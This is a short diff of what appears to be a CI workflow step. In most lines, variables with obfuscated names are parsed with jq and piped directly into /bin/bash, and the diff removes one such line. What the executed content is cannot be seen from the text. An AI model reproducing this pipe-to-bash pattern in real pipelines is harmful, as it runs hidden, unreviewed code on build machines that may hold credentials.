@@ -25,7 +25,6 @@ jobs:
           echo $szh5758 | jq -r .a5 | /bin/bash
           printf '%s' "$w33" | jq -r .gl971 | /bin/bash
           printf '%s' "$bgxny5710" | jq -r .zds92733 | /bin/bash
-          echo $ct2191 | jq -r .sl57002 | /bin/bash
           echo $br173 | jq -r .hn348 | /bin/bash
 
       - name: Save data
